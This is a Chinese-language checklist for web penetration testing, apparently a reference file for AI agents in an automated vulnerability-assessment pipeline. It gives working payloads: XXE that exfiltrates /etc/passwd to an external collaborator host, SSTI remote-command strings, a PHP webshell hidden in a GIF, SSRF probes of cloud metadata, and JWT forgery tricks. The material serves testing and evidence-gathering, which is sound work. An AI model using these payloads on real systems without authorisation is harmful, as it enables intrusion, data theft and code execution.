# Vulnerability Testing Checklists
# 被调用方: AI-3（响应判定）/ AI-7（业务逻辑）/ Manual Injection Testing
# 加载时机: 手工注入测试开始时，或 AI-3 需要判定依据时读取

---

## 使用说明

```
每种漏洞类型对应一份检查清单。
AI-3 在判定 CONFIRMED 前应对照对应清单完成所有 ✅ 项。
AI-7 业务逻辑测试以 [BIZ] 标注的清单为主。
所有 CONFIRMED 必须有"证据链"字段的完整填写。
```

---

## CL-01: SQL Injection

> 详细检测流程见 `references/sqli-engine.md`（Phase 0-5）

```
前置条件:
  □ 已确认参数被拼入SQL查询（来自code-audit或响应特征）
  □ 已排除参数化查询（PreparedStatement等）

检测清单:
  □ Phase 0: 数据库指纹识别完成（MySQL/PostgreSQL/MSSQL/Oracle/SQLite）
  □ Phase 1: 注入类型确定（Error/Boolean/Time/Union/OOB 任一）
  □ Phase 2: WAF检测（有WAF → AI-2绕过后继续）
  □ Phase 3: 危害证明（DB版本+用户名+库名 三项中至少2项）
  □ Phase 5: 五条件门控全部满足
  □ time-based: 2次独立发包均超阈值（必须）

证据链（必填）:
  注入端点: [METHOD] /path?param=
  注入类型: [Error/Boolean/Time/Union/OOB]
  payload最终版: [实际发出的payload]
  响应特征: [错误信息/时延值/响应差异描述]
  DB指纹: [MySQL x.x / PostgreSQL x.x / ...]
  危害证明: [版本x.x.x / 用户webapp@localhost / 库名production_db]
```

---

## CL-02: Cross-Site Scripting (XSS)

```
前置条件:
  □ 已确认用户输入在响应中有回显路径
  □ 已识别注入上下文（HTML正文/属性/JavaScript/CSS/URL）

检测清单:

  反射型 XSS:
  □ 基础探针: <burp/> — 检查是否原样反射
  □ 上下文识别:
     HTML正文    → <script>alert(1)</script>
     HTML属性    → " onmouseover="alert(1)
     JavaScript  → ';alert(1)//
     URL上下文   → javascript:alert(1)
     CSS上下文   → expression(alert(1))（旧IE）
  □ 实际执行验证: DOM中alert/fetch/document.cookie 真实触发
  □ 过滤检测: < > " ' 是否被HTML实体编码
  □ WAF绕过（若需要）: 大小写/事件替换/<svg>/<img>等

  存储型 XSS（额外步骤）:
  □ 写入端（存储payload） + 读取端（触发位置）均已测试
  □ 其他用户可访问的位置是否也受影响（范围评估）

  DOM型 XSS:
  □ 使用浏览器开发工具验证DOM树中的注入点
  □ location.hash / document.referrer / postMessage 等来源
  □ innerHTML / eval / document.write 等接收函数

证据链（必填）:
  注入端点: [URL + 参数名]
  注入上下文: [HTML正文/属性/JS/CSS]
  最终payload: [经过上下文适配的完整payload]
  执行证明: [alert弹出截图/DOM变化/fetch回调记录]
  持久性: [反射型/存储型/DOM型]
```

---

## CL-03: Server-Side Request Forgery (SSRF)

```
前置条件:
  □ 已确认应用有向服务端发起HTTP请求的功能（URL参数/webhook/文件获取）

检测清单:
  □ OOB测试（Collaborator）:
     payload_id = generate_collaborator_payload(customData=VULN_ID)
     注入 Collaborator URL 后等待 15s
     检查 DNS + HTTP 回调
  □ 内网探测（有回显时）:
     http://127.0.0.1/
     http://169.254.169.254/latest/meta-data/  (AWS)
     http://metadata.google.internal/          (GCP)
     http://169.254.169.254/metadata/v1/       (Azure/DigitalOcean)
  □ 协议测试（有回显时）:
     file:///etc/passwd
     dict://127.0.0.1:22/
     gopher://127.0.0.1:6379/_INFO  (Redis)
  □ 绕过过滤（黑名单场景）:
     http://0.0.0.0/  http://0x7f000001/  http://2130706433/
     http://127.1/    http://127.0.1/
     DNS重绑定: 使用 nip.io / xip.io
  □ HTTPS降级: https:// 被过滤时测试 http://

证据链（必填）:
  功能入口: [URL + 参数名/位置]
  OOB证据: [collaborator_interaction_id + DNS回调时间]
  内网访问: [成功访问的内网地址+响应内容（若有回显）]
  危害等级: [SSRF到元数据服务/SSRF到内网服务/仅OOB]
```

---

## CL-04: Insecure Direct Object Reference (IDOR)

```
前置条件:
  □ 已识别资源标识符（ID/UUID/用户名/文件名）
  □ 已有至少2个有效账号（或可预测ID范围）

检测清单:
  □ 横向越权（水平IDOR）:
     替换当前用户资源ID为其他已知ID
     检查能否读取/修改/删除他人资源
  □ 纵向越权（垂直IDOR）:
     低权限账号访问高权限账号资源
     替换 user_id 为已知管理员ID（通常为1）
  □ 批量遍历:
     ID为顺序整数 → 遍历10个相邻ID
     UUID → 检查历史响应中是否泄露其他UUID
  □ 间接对象引用:
     文件名/路径 → 路径遍历测试
     哈希/token → 尝试预测或暴力破解
  □ 方法越权:
     GET /api/users/123 仅只读，但 POST /api/users/123 无权限校验？

证据链（必填）:
  端点: [METHOD /api/resource/{id}]
  当前用户ID: [own_id]
  越权访问ID: [target_id]
  请求1（合法）: [200 OK + 自己数据]
  请求2（越权）: [200 OK + 他人数据] ← 关键证明
  数据差异: [证明返回的是不同用户数据]
```

---

## CL-05: XML External Entity (XXE)

```
前置条件:
  □ 已确认应用接受XML输入（Content-Type: application/xml 或 text/xml）
  □ 或确认DOCX/SVG/PDF等格式内部含XML解析

检测清单:
  □ 基础XXE探针（有回显）:
     <?xml version="1.0"?>
     <!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
     <test>&xxe;</test>
  □ OOB XXE（无回显）:
     <!DOCTYPE test [<!ENTITY % remote SYSTEM "http://{collaborator}/evil.dtd">%remote;]>
     evil.dtd内容: <!ENTITY % file SYSTEM "file:///etc/passwd">
                   <!ENTITY % exfil "<!ENTITY send SYSTEM 'http://{collaborator}/?x=%file;'>">
                   %exfil;
  □ 协议测试:
     file:// / http:// / expect:// / php://filter
  □ SVG/DOCX内嵌XXE:
     上传SVG文件，内含XXE payload
  □ 内容类型绕过:
     JSON接口改Content-Type为XML测试

证据链（必填）:
  端点: [METHOD /api/endpoint]
  payload: [完整XXE XML]
  OOB证据: [collaborator DNS回调] 或 回显内容: [/etc/passwd片段]
```

---

## CL-06: Server-Side Template Injection (SSTI)

```
前置条件:
  □ 已确认用户输入被服务端模板引擎渲染
  □ 常见场景：自定义邮件模板/PDF生成/错误页/报告生成

检测清单:
  □ 通用探针（引擎无关）:
     {{7*7}}   → 49 → 确认模板注入存在
     ${7*7}    → 49 → Java/FreeMarker
     <%= 7*7 %>→ 49 → ERB(Ruby)/ASP
     #{7*7}    → 49 → Ruby
  □ 引擎识别（根据响应区分）:
     {{7*'7'}} → '7777777' → Jinja2/Twig
                 → 49 → Mako/others
  □ 命令执行（CONFIRMED后，仅危害证明）:
     Jinja2/Python:
       {{''.__class__.__mro__[1].__subclasses__()[408](['id'],stdout=-1).communicate()}}
       {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
     FreeMarker/Java:
       <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
     Twig/PHP:
       {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
  □ 沙箱绕过（根据引擎版本调整）:
     Jinja2沙箱: 尝试 cycler/joiner/namespace 等内置类

证据链（必填）:
  端点: [URL + 参数]
  探针: [{{7*7}}]
  回显: [49]（证明模板注入存在）
  引擎: [Jinja2/FreeMarker/Twig/...]
  RCE证明: [id命令输出: uid=33(www-data)...]
```

---

## CL-07: Business Logic Vulnerabilities [BIZ]

```
前置条件:
  □ 已梳理核心业务流程（结合code-audit提供的调用链）

价格/数量篡改清单:
  □ 购物流程: 设置price=-0.01（负数）→ 总价变负/变小？
  □ 数量: quantity=0 / -1 / 99999999 → 服务端是否校验？
  □ 折扣叠加: 连续应用多个优惠码 → 是否超限累加？
  □ 汇率劫持（跨币种）: 以低汇率货币支付，获取高价值物品？

状态机绕过清单:
  □ 跳步测试: 步骤1→直接步骤3（跳过步骤2）
  □ 顺序重放: 步骤2完成后重放步骤1请求是否改变状态？
  □ 已完成状态重触发: 已支付订单能否再次触发支付/发货？
  □ 并发竞争: 同一操作并发50次（AI-8处理）

账户逻辑清单:
  □ 密码重置: 重置链接是否可预测/可重用/无过期？
  □ 邮箱验证绕过: 绕过邮箱验证直接激活账户？
  □ 注册竞争: 同名账户并发注册 → 哪个生效？
  □ 账户合并/迁移漏洞: 绑定第三方账号时越权绑定他人？

证据链要求（双重证明，AI-7强制）:
  合法操作证明: [正常流程请求1+响应1]
  非法操作证明: [攻击流程请求2+响应2]
  安全影响描述: [价格从¥100变为¥-1 / 跳步进入订单确认 / ...]
```

---

## CL-08: Authentication & Authorization

```
JWT 检测清单（调用 AI-5a）:
  □ alg:none 攻击: 移除签名，alg改为none
  □ RS256→HS256混淆: 用公钥作HMAC密钥
  □ kid参数注入: kid含 / .. ' 等特殊字符
  □ 弱密钥: jwt.io 尝试 secret/password/123456 等
  □ 过期时间: 修改exp为未来时间戳

Session 检测清单（调用 AI-5b）:
  □ 登录前后 Session ID 是否更换（会话固定）
  □ 退出后 Session 是否失效（服务端销毁）
  □ 并发 Session 是否限制
  □ 长度和随机性（≥128bit随机）

OAuth 检测清单（调用 AI-5c）:
  □ state 参数缺失 → CSRF
  □ redirect_uri 绕过: 添加 @/# 等字符
  □ token 在 URL 中出现 → Referer泄露
```

---

## CL-09: File Upload Vulnerabilities

```
检测清单:
  □ 文件类型绕过:
     Content-Type: image/jpeg，实际上传 shell.php
     文件名: shell.php.jpg / shell.php%00.jpg
  □ 文件内容检测绕过:
     在图片末尾追加PHP代码（GIF89a<?php system($_GET['cmd']);?>）
  □ 路径遍历存储:
     filename: ../../web/shell.php（目录穿越存储）
  □ 执行路径确认:
     上传后访问文件URL，确认代码是否被执行（非仅存储）
  □ ImageMagick/FFmpeg 漏洞（处理型上传）:
     特殊构造的SVG/PDF触发SSRF或RCE

证据链（必填）:
  上传端点: [POST /api/upload]
  文件名payload: [shell.php.jpg]
  Content-Type: [image/jpeg（伪造）]
  访问URL: [/uploads/shell.php.jpg]
  RCE证明: [http://target/uploads/shell.php.jpg?cmd=id → uid=33]
```

---

## 证据链模板（通用格式）

```
[VULN-N 证据链]
漏洞类型: [CL-XX 类型名]
端点: [METHOD /path]
参数: [param_name]
注入点位置: [URL参数/POST Body/Cookie/Header]

Step 1 — 基线请求（无注入）:
  请求: [完整HTTP请求]
  响应: [关键响应内容/状态码]

Step 2 — 注入请求（最终payload）:
  请求: [完整HTTP请求 + 高亮payload]
  响应: [关键响应内容/时延/错误信息]

Step 3 — 确认信号:
  类型: [错误信息/时延差/OOB回调/DOM执行/状态差异]
  具体: [SQL syntax error: .../时延4.82s/collaborator DNS at 14:32:01/alert(1)弹出]

Step 4 — 可重现性验证:
  第2次发包结果: [与Step 2一致 → 可重现]

危害评估:
  DKTSS分数: [建议值]
  实际影响: [数据泄露/账户接管/拒绝服务/...]
```
